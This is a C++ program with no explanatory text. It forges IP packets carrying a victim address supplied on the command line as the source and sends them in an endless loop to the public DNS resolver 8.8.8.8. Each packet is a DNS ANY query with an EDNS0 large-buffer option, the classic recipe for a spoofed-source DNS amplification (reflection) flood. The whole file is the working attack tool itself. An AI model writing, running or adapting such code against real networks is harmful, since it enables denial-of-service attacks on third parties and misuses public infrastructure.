#include <unistd.h>
#include <iostream>
#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <arpa/inet.h>

#define SRC_PORT "7"
#define DST_PORT "53"
#define DST_ADDR "8.8.8.8"
#define PAYLOAD_LENGTH 0

#define PCKT_LEN 8192

using namespace std;

struct dnsheader {
	unsigned short dnsh_id;
	unsigned short dnsh_flag;
	unsigned short q_count;
	unsigned short ans_count;
	unsigned short auth_count;
	unsigned short add_count;
}__attribute__((packed));;

unsigned short csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	for(sum=0; nwords>0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum &0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

void usage(char *str)
{
	printf("%s\n Please put in target ip\n", str);
	exit(0);
}

int main(int argc, char **argv)
{
	if(argc<2){
		usage(argv[0]);
	}

	char *SRC_ADDR = argv[1];
	unsigned short uid = 0x1234;
	while(1)
	{
		int sd;
		char buffer[PCKT_LEN];
		struct iphdr *ip = (struct iphdr*) buffer;
		struct udphdr *udp = (struct udphdr*) (buffer + sizeof(struct iphdr));
		struct dnsheader *dnsh = (struct dnsheader*) (buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
		struct sockaddr_in sin, din;
		int one = 1;
		const int *val = &one;

		memset(buffer, 0,PCKT_LEN);
		sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		if(sd < 0)
		{
			cout << "socket error"<< sd << endl;
			exit(-1);
		}

		sin.sin_family = AF_INET;
		sin.sin_port = htons(atoi(DST_PORT));
		sin.sin_addr.s_addr = inet_addr(DST_ADDR);

		ip->ihl = 5;
		ip->version = 4;
		ip->tos = 0;
		ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dnsheader) + 23;
		ip->id = htonl(getpid());
		ip->ttl = 255;
		ip->protocol = IPPROTO_UDP;
		ip->saddr = inet_addr(SRC_ADDR);
		ip->daddr = inet_addr(DST_ADDR);
		ip->check = csum((unsigned short *)buffer, ip->tot_len);


		udp->source = htons(atoi(SRC_PORT));
		udp->dest = htons(atoi(DST_PORT));
		udp->len = htons(sizeof(struct udphdr) + sizeof(dnsheader) + 23);
		udp->check = 0;

		dnsh->dnsh_id = uid++;

		dnsh->dnsh_flag = 0b0010000000000001;
		dnsh->q_count = htons(1);
		dnsh->ans_count = 0;
		dnsh->auth_count = 0;
		dnsh->add_count = 256;
		
		char domainname[] = {2, 'u', 's', 3, 'o', 'r', 'g', 0};
		memcpy(buffer + sizeof(iphdr) + sizeof(udphdr) + sizeof(dnsheader), domainname, 8);
		char qtypeqclass[] = "\x00\xff\x00\x01";
		memcpy(buffer + sizeof(iphdr) + sizeof(udphdr) + sizeof(dnsheader) + strlen(domainname) + 1, qtypeqclass, 4);
		char opt[] = "\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00";
		memcpy(buffer + sizeof(iphdr) + sizeof(udphdr) + sizeof(dnsheader) + strlen(domainname) + 5, opt, 11);

		setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

		sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
		close(sd);
		cout << "sent" << endl;
		sleep(2);

	}
	return 0;

}
